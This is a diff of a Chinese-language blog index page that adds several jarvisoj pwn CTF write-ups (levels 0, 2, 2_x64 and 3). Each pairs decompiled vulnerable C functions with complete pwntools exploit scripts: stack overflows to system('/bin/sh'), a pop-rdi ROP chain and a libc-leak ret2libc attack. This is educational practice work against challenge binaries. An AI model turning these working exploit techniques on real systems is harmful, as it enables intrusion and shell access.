@@ -5,16 +5,13 @@
   
   <title>schemr&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="schemr的博客, 记录日常">
-<meta property="og:type" content="website">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="schemr&#39;s blog">
 <meta property="og:url" content="https://yintianliang.github.io/index.html">
 <meta property="og:site_name" content="schemr&#39;s blog">
-<meta property="og:description" content="schemr的博客, 记录日常">
 <meta property="og:locale" content="default">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="schemr&#39;s blog">
-<meta name="twitter:description" content="schemr的博客, 记录日常">
   
     <link rel="alternate" href="/atom.xml" title="schemr&#39;s blog" type="application/atom+xml">
   
@@ -100,7 +97,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://yintianliang.github.io/2018/05/07/improve_hexo_table/" data-id="cjgx6lzuz0000azwjjts4mw98" class="article-share-link">分享</a>
+      <a data-url="https://yintianliang.github.io/2018/05/07/improve_hexo_table/" data-id="cjgz87atv0001hkwjfvj39pla" class="article-share-link">分享</a>
       
       
       
@@ -160,11 +157,609 @@ ssh fd@pwnable.kr -p2222 (pw:guest)
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://yintianliang.github.io/2018/05/04/pwnable.kr_Toddler's Bottle/" data-id="cjgx6lzwe0008azwjzkzfq9pi" class="article-share-link">分享</a>
+      <a data-url="https://yintianliang.github.io/2018/05/04/pwnable.kr_Toddler's Bottle/" data-id="cjgz87avh000dhkwjbncgy9ye" class="article-share-link">分享</a>
       
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-jarvisoj_pwn_level3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/14/jarvisoj_pwn_level3/" class="article-date">
+  <time datetime="2018-04-14T08:20:00.000Z" itemprop="datePublished">2018-04-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/14/jarvisoj_pwn_level3/">jarvisoj - pwn - level3</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">分析</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+题目包含两个文件 level3 libc-2.19.so
+</p>
+
+<p>
+首先 checksec 一下, 开启了NX
+</p>
+
+<pre class="example">
+[*] '/home/zhonghua/writeup/pwn/jarvisoj-level3/level3'
+  Arch:     i386-32-little
+  RELRO:    Partial RELRO
+  Stack:    No canary found
+  NX:       NX enabled
+  PIE:      No PIE (0x8048000)
+</pre>
+
+<p>
+拖进IDA, 溢出点很明显
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+不过没有看到 /bin/sh, 也没有看到 system
+应该是要从 libc 中找了
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">writeup</h2>
+<div class="outline-text-2" id="text-2">
+<div class="org-src-container">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> CTF.easypwn.easypwn <span class="keyword">import</span> LeakLibc</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> platform <span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span>:</span><br><span class="line">    context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">    io  = process(<span class="string">'./level3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io  = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">lc_start  = <span class="string">'__libc_start_main'</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">b'main'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">b'write'</span>]</span><br><span class="line">libc_got  = elf.got[lc_start.encode()]</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b'\x90'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>),</span><br><span class="line">    write_plt, main_addr, <span class="number">1</span>, libc_got, <span class="number">4</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'Input:\n'</span>, payload)</span><br><span class="line"></span><br><span class="line">libc = LeakLibc(lc_start, u32(io.recv(<span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b'\x90'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>),</span><br><span class="line">    libc.dump(<span class="string">'system'</span>),</span><br><span class="line">    <span class="number">0xdeadbeef</span>,</span><br><span class="line">    libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'Input:\n'</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+flag: <code>CTF{d85346df5770f56f69025bc3f5f1d3d0}</code></p>
+</div>
+</div>
+
+Last Updated 2018-05-09 三 22:54.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://yintianliang.github.io/2018/04/14/jarvisoj_pwn_level3/" data-id="cjgz87au50007hkwj1xjcewie" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jarvisoj/">jarvisoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-jarvisoj_pwn_level2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/14/jarvisoj_pwn_level2/" class="article-date">
+  <time datetime="2018-04-14T06:15:00.000Z" itemprop="datePublished">2018-04-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/14/jarvisoj_pwn_level2/">jarvisoj - pwn - level2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+
+<p>
+(setq org-babel-python-command "python2")
+</p>
+
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">分析</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+<code>checksec level2</code> 结果如下
+</p>
+
+<pre class="example">
+[*] '/home/zhonghua/writeup/pwn/jarvisoj-level2/level2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</pre>
+
+<p>
+看起来相当的普通(?)
+</p>
+
+
+<p>
+拖进IDA, 发现直接调用了system函数, 有趣有趣
+</p>
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>{</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+跟进vulnerable_function
+</p>
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+同时Shift+F12可以看到0804A024处有个字符串'/bin/sh'
+</p>
+<pre class="example">
+LOAD:08048154   00000013    C   /lib/ld-linux.so.2
+LOAD:0804822D   0000000A    C   libc.so.6
+LOAD:08048237   0000000F    C   _IO_stdin_used
+LOAD:08048246   00000005    C   read
+LOAD:0804824B   00000007    C   system
+LOAD:08048252   00000012    C   __libc_start_main
+LOAD:08048264   0000000F    C   __gmon_start__
+LOAD:08048273   0000000A    C   GLIBC_2.0
+.rodata:08048540    0000000C    C   echo Input:
+.rodata:0804854C    00000014    C   echo 'Hello World!'
+.eh_frame:080485CB  00000005    C   ;*2$\"
+.data:0804A024  00000008    C   /bin/sh
+</pre>
+
+<p>
+没有函数可以让我们直接调用得到shell
+</p>
+
+<p>
+看起来只能尝试构造一个栈帧, 以'/bin/sh'为参数调用system
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">writeup</h2>
+<div class="outline-text-2" id="text-2">
+<div class="org-src-container">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9878</span>)</span><br><span class="line"><span class="comment"># io = process('./level2')</span></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system函数,"/bin/sh"字符串地址</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#       vulnerable_function</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      +----------------+               system</span></span><br><span class="line"><span class="comment">#      |  buffer(0x88)  |</span></span><br><span class="line"><span class="comment">#      +----------------+         +----------------+</span></span><br><span class="line"><span class="comment">#      |    ebp(0x4)    |         |     buffer     |</span></span><br><span class="line"><span class="comment">#      +----------------+         +----------------+</span></span><br><span class="line"><span class="comment"># +--&gt; |ret(system_addr)| +-----&gt; |      ebp       |</span></span><br><span class="line"><span class="comment">#      +----------------+         +----------------+</span></span><br><span class="line"><span class="comment">#      |   (any_addr)   |         |  ret(any_addr) |</span></span><br><span class="line"><span class="comment">#      +----------------+         +----------------+</span></span><br><span class="line"><span class="comment">#      |   (sh_addr)    |         |  args(sh_addr) |</span></span><br><span class="line"><span class="comment">#      +----------------+         +----------------+</span></span><br><span class="line">payload = (<span class="number">0x88</span> + <span class="number">0x4</span>) * <span class="string">'\x90'</span> + p32(system_addr) + <span class="string">'\x90'</span> * <span class="number">0x4</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">print(io.recv())</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+</div>
+</div>
+</div>
+
+Last Updated 2018-05-09 三 22:52.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://yintianliang.github.io/2018/04/14/jarvisoj_pwn_level2/" data-id="cjgz87au20005hkwj8h717eij" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jarvisoj/">jarvisoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-jarvisoj_pwn_level2_x64" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/14/jarvisoj_pwn_level2_x64/" class="article-date">
+  <time datetime="2018-04-14T06:09:00.000Z" itemprop="datePublished">2018-04-14</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/14/jarvisoj_pwn_level2_x64/">jarvisoj - pwn - level2_x64</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+
+<p>
+(setq org-babel-python-command "python2")
+</p>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">分析</h2>
+<div class="outline-text-2" id="text-1">
+<pre class="example">
+[*] '/home/zhonghua/writeup/pwn/jarvisoj-level2(64)/level2_x64'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+
+<p>
+和level2区别不大, 只需要注意64位程序的参数在传递时前六个参数储存在寄存器rdi, rsi, rdx, rcx, r8, r9中
+</p>
+
+<p>
+然而将参数送到寄存器中需要执行代码, 这里开启了NX似乎没有办法
+</p>
+
+<p>
+Google一下, 发现原来要用 ROP(Return Oriented Programming) 技术
+</p>
+
+<blockquote>
+<p>
+随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
+</p>
+
+<p>
+之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件
+</p>
+
+<ul class="org-ul">
+<li>程序存在溢出，并且可以控制返回地址。
+</li>
+<li>可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。
+</li>
+</ul>
+</blockquote>
+
+
+<p>
+也就是说我们需要找到一个语句能将 sh_addr 送入 rdi 中,
+直接 mov sh_addr, rdi 这种语句肯定很难找, 可以使用pop来间接达到目的
+</p>
+
+<p>
+pop 可将栈顶元素弹出并送入指定寄存器
+</p>
+
+<p>
+使用 ROPgadget 进行搜索
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary level2_x64 --only <span class="string">"pop|ret"</span></span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+可以看到 0x00000000004006b3 就是我们想要的 gadgets
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">writeup</h2>
+<div class="outline-text-2" id="text-2">
+<div class="org-src-container">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9882</span>)</span><br><span class="line"><span class="comment"># io = process('./level2_x64')</span></span><br><span class="line">elf = ELF(<span class="string">'./level2_x64'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = elf.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">gad_addr = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x90'</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(gad_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">print(io.recv())</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+</div>
+</div>
+</div>
+
+Last Updated 2018-05-09 三 22:53.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://yintianliang.github.io/2018/04/14/jarvisoj_pwn_level2_x64/" data-id="cjgz87au40006hkwjjwu9bjos" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jarvisoj/">jarvisoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-jarvisoj_pwn_level0" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/23/jarvisoj_pwn_level0/" class="article-date">
+  <time datetime="2018-03-23T10:21:00.000Z" itemprop="datePublished">2018-03-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/23/jarvisoj_pwn_level0/">jarvisoj - pwn - level0</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+
+<p>
+(setq org-babel-python-command "python2")
+</p>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">分析</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+首先 <code>checksec level0</code> 看看
+</p>
+
+<pre class="example">
+[*] '/home/zhonghua/writeup/pwn/jarvisoj-level0/level0'
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</pre>
+
+<p>
+只开了NX
+</p>
+
+<p>
+拖进IDA, F5分析, 结果如下
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>{</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+继续跟进vulnerable_function
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">{</span><br><span class="line">  char buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+可以看到buf存在溢出
+</p>
+
+<p>
+同时左侧函数列表可以发现一个叫callsystem的函数, 内容如下
+</p>
+
+<div class="org-src-container">
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span><br><span class="line"></span>{</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+思路很明显了, 使vulnerable_function函数返回时返回到callsystem函数
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">writeup</h2>
+<div class="outline-text-2" id="text-2">
+<div class="org-src-container">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9881</span>)</span><br><span class="line"><span class="comment"># io = process('./level0')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level0'</span>)</span><br><span class="line"></span><br><span class="line">fun_addr = elf.symbols[<span class="string">'callsystem'</span>]</span><br><span class="line"><span class="comment"># print(p64(fun_addr))</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">0x8</span>) + p64(fun_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.interactive()</span></span><br><span class="line">io.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+</div>
+
+<p>
+flag为CTF{713ca3944e92180e0ef03171981dcd41}</p>
+</div>
+</div>
+
+Last Updated 2018-05-09 三 22:48.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://yintianliang.github.io/2018/03/23/jarvisoj_pwn_level0/" data-id="cjgz87atz0003hkwju7vho4up" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jarvisoj/">jarvisoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-jarvisoj_pwn_level1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/23/jarvisoj_pwn_level1/" class="article-date">
+  <time datetime="2018-03-23T10:17:00.000Z" itemprop="datePublished">2018-03-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/23/jarvisoj_pwn_level1/">jarvisoj - pwn - level1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+
+<p>
+(setq org-babel-python-command "python2")
+</p>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1">分析</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+首先 <code>checksec leve1</code>
+</p>
+
+<pre class="example">
+[*] '/home/zhonghua/writeup/pwn/jarvisoj-level1/level1'
+  Arch:     i386-32-little
+  RELRO:    Partial RELRO
+  Stack:    No canary found
+  NX:       NX disabled
+  PIE:      No PIE (0x8048000)
+  RWX:      Has RWX segments
+</pre>
+
+<p>
